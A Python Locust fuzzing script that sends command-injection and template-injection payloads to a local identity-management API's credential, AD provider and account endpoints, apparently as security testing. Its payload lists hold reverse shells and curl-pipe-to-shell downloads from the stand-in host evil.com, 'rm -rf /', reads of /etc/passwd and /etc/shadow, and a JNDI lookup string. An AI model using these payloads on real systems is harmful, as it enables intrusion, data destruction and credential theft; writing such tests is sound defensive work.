import json
import logging
from locust import HttpUser, task, SequentialTaskSet, constant

log = logging.getLogger(__name__)

class CommandInjectionFuzz(SequentialTaskSet):

    def on_start(self):
        """Get authentication token"""
        payload = {"username": "admin", "password": "admin123"}
        response = self.client.post("/api/v3/login", json=payload, verify=False, catch_response=True)
        self.token = "fake_token" if response.status_code != 200 else response.json()["access_token"]

    @task
    def fuzz_command_injection_credential_username(self):
        """Test command injection in credential username"""
        headers = {"Authorization": f"Bearer {self.token}"}

        command_injection_payloads = [
            "admin; cat /etc/passwd",
            "user && rm -rf /",
            "test | whoami",
            "admin`id`",
            "user$(whoami)",
            "admin; nc -e /bin/sh evil.com 4444",
            "test && curl http://evil.com/shell.sh | sh",
            "user; echo 'pwned' > /tmp/hacked",
            "admin || wget http://evil.com/malware",
            "test && ping -c 1 evil.com",
            "user; /bin/bash -i >& /dev/tcp/evil.com/4444 0>&1"
        ]

        for payload in command_injection_payloads:
            credential_data = {
                "name": "test_cred",
                "username": payload,
                "password": "testpass",
                "type": "OS"
            }

            with self.client.post("/api/v3/raw-credentials",
                                  headers=headers,
                                  json=credential_data,
                                  verify=False,
                                  catch_response=True) as response:

                if response.status_code in [400, 422]:
                    response.success()
                    log.info(f"Command injection blocked: {payload}")
                elif response.status_code == 500:
                    log.warning(f"Server error with command injection: {payload}")
                    response.success()
                else:
                    response.success()

    @task
    def fuzz_command_injection_ad_host(self):
        """Test command injection in AD provider host"""
        headers = {"Authorization": f"Bearer {self.token}"}

        host_command_injections = [
            "test-host.com; cat /etc/passwd",
            "ldap.company.com && id",
            "ad.domain.com | whoami",
            "host.com`curl http://evil.com`",
            "server.com$(wget evil.com/shell)",
            "ldap.test.com; /bin/nc -e /bin/sh evil.com 4444"
        ]

        for injection in host_command_injections:
            ad_provider_data = {
                "host": injection,
                "port": 389,
                "selector": "test.com",
                "serviceAccount": {
                    "name": "testuser",
                    "password": "testpass"
                }
            }

            with self.client.post("/api/v3/active-directory-identity-providers",
                                  headers=headers,
                                  json=ad_provider_data,
                                  verify=False,
                                  catch_response=True) as response:

                if response.status_code in [400, 422]:
                    response.success()
                    log.info(f"Host command injection blocked: {injection}")
                else:
                    response.success()

    @task
    def fuzz_command_injection_service_password(self):
        """Test command injection in service account password"""
        headers = {"Authorization": f"Bearer {self.token}"}

        password_injections = [
            "password123; whoami",
            "pass && curl evil.com",
            "secret | id",
            "admin`cat /etc/shadow`",
            "test$(uname -a)",
            "password; echo 'hacked' | mail admin@company.com"
        ]

        for injection in password_injections:
            ad_provider_data = {
                "host": "test-host.com",
                "port": 389,
                "selector": "test.com",
                "serviceAccount": {
                    "name": "testuser",
                    "password": injection
                }
            }

            with self.client.post("/api/v3/active-directory-identity-providers",
                                  headers=headers,
                                  json=ad_provider_data,
                                  verify=False,
                                  catch_response=True) as response:

                if response.status_code in [400, 422]:
                    response.success()
                    log.info(f"Password command injection blocked: {injection}")
                else:
                    response.success()

    @task
    def fuzz_command_injection_local_account_email(self):
        """Test command injection in local account email"""
        headers = {"Authorization": f"Bearer {self.token}"}

        email_injections = [
            "admin@test.com; cat /etc/passwd",
            "user@domain.com && id",
            "test@company.com | whoami",
            "email@test.com`curl evil.com`",
            "admin@domain.com$(wget evil.com/shell)"
        ]

        for injection in email_injections:
            account_data = {
                "name": "test_user",
                "firstName": "Test",
                "lastName": "User",
                "emailAddress": injection
            }

            with self.client.post("/api/v3/local-identity-providers/default/accounts",
                                  headers=headers,
                                  json=account_data,
                                  verify=False,
                                  catch_response=True) as response:

                if response.status_code in [400, 422]:
                    response.success()
                    log.info(f"Email command injection blocked: {injection}")
                else:
                    response.success()

    @task
    def fuzz_template_injection(self):
        """Test template injection attacks"""
        headers = {"Authorization": f"Bearer {self.token}"}

        template_injections = [
            "${jndi:ldap://evil.com/exploit}",
            "{{7*7}}",
            "${java:runtime.exec('id')}",
            "#{7*7}",
            "{{config.items()}}",
            "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "${java:os.getEnv('PATH')}"
        ]

        for injection in template_injections:
            credential_data = {
                "name": injection,
                "username": "testuser",
                "password": injection,
                "type": "OS"
            }

            with self.client.post("/api/v3/raw-credentials",
                                  headers=headers,
                                  json=credential_data,
                                  verify=False,
                                  catch_response=True) as response:

                if response.status_code in [400, 422, 500]:
                    response.success()
                    log.info(f"Template injection blocked: {injection}")
                else:
                    response.success()

class CommandInjectionUser(HttpUser):
    wait_time = constant(1)
    tasks = [CommandInjectionFuzz]
    host = "https://localhost:8443"
